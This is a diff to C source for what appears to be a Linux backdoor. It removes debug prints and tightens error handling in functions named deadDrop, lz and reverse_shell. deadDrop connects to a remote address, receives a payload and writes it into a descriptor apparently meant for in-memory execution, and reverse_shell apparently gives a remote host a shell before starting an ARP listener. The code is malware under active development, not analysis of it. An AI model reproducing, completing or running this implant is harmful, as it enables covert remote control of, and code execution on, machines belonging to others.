@@ -68,6 +68,7 @@ int methodID(void)
 	char *split = ".";
 
 	version = strtok(data.release,split);
+	// Convert char* to int
 	int ver = *version - '0';
 	
 	//Debug line
@@ -98,10 +99,9 @@ int lz(int methodID){
 	}
 	else if (methodID == 3){ exit(1);}
 	else{
-		printf("else FD: %d",loadfd);
-		return loadfd;}
-
-	printf("Outside if statements, FD: %d\n",loadfd);
+		//Memory allocation failed
+		exit(1);
+	}
 	return loadfd;
 }
 
@@ -125,11 +125,8 @@ int deadDrop(unsigned int mailslot, unsigned short id){
 					if(connect(sock, (struct sockaddr*)&mailBox, sizeof(mailBox)) < 0){ exit(2);}
                                 
 					method = methodID();
-					printf("methodID is: %d\n", method);
 					zone = lz(method);
-					printf("zone is: %d\n", zone);
 					if(zone <= 0){ exit(3);}
-					//bytes = recv(sock,buf,1024,0);
 					while((bytes = recv(sock,buf,1024,0)) > 0){
 						write(zone,buf,bytes);
 					}
@@ -187,6 +184,7 @@ int reverse_shell(unsigned int IP_ADDR, unsigned short PORT){
 	}
 	wait(NULL);
 	arp_listener();
+	return 0;
 }
 
 int arp_listener()
